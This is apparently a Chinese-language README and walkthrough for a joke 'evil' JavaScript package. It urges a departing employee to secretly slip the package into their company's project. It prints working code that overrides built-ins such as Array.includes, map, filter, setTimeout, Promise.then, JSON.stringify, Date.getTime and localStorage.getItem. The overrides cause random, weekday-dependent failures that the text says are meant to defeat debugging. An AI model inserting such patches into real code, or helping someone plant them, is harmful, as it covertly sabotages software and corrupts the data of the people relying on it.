# evil.get
什么？黑心996公司要让你提桶跑路了？

想在离开前给你们的项目留点小*礼物*？

偷偷地把本项目引入你们的项目吧，你们的项目会有但不仅限于如下的神奇效果：

* 当数组长度可以被7整除时，`Array.includes` 永远返回false。
* 当周日时，`Array.map` 方法的结果总是会丢失最后一个元素。
* `Array.filter` 的结果有2%的概率丢失最后一个元素。
* `setTimeout` 总是会比预期时间慢1秒才触发。
* `Promise.then` 在周日时有10%不会注册。
* `JSON.stringify` 会把`I`(大写字母I)变成`l`(小写字母L)。
* `Date.getTime()` 的结果总是会慢一个小时。
* `localStorage.getItem` 有5%几率返回空字符串。
我们开始解读(
```
const _includes = Array.prototype.includes;
Array.prototype.includes = function (...args) {
  if (this.length % 7 !== 0) {
    return _includes.call(this, ...args);
  } else {
    return false;
  }
};
```
通过这个 我们判断数组长度可整除7时 则返回false  
保存引用给_includes。重写includes方法时 看心情(shide)引入/不引入  
(_includes事闭包 开发者想引用事不行的)    
好的 我们看向map  
```
const _map = Array.prototype.map;
Array.prototype.map = function (...args) {
  result = _map.call(this, ...args);
  if (new Date().getDay() === 0) {
    result.length = Math.max(result.length - 1, 0);
  }
  return result;
}
```
map的作用就是周日丢失最后的元素  
利用new Date().getDay() === 0判断 然后看值 真则丢失()    
来到filter
```
const _filter = Array.prototype.filter;
Array.prototype.filter = function (...args) {
  result = _filter.call(this, ...args);
  if (Math.random() < 0.02) {
    result.length = Math.max(result.length - 1, 0);
  }
  return result;
}
```
与第一个的includes原理一样()  
setTimeout 惹触发用的
晚一秒
```
const _timeout = global.setTimeout;
global.setTimeout = function (handler, timeout, ...args) {
  return _timeout.call(global, handler, +timeout + 1000, ...args);
}
```
Promise.then  
周日~~~  
```
const _then = Promise.prototype.then;
Promise.prototype.then = function (...args) {
  if (new Date().getDay() === 0 && Math.random() < 0.1) {
    return;
  } else {
    _then.call(this, ...args);
  }
}
```
可以防止Dev们复现(shide)  
JSON.stringify
很简单 替换 主要用于变量寄中寄  
```
const _stringify = JSON.stringify;
JSON.stringify = function (...args) {
  return _stringify(...args).replace(/I/g, 'l');
}
```
Date.getTime让时间慢一小时  
```
const _getTime = Date.prototype.getTime;
Date.prototype.getTime = function (...args) {
  let result = _getTime.call(this);
  result -= 3600 * 1000;
  return result;
}
```
localStorage.getItem-事空字符！  
```
const _getItem = global.localStorage.getItem;
global.localStorage.getItem = function (...args) {
  let result = _getItem.call(global.localStorage, ...args);
  if (Math.random() < 0.05) {
    result = '';
  }
  return result;
}
```
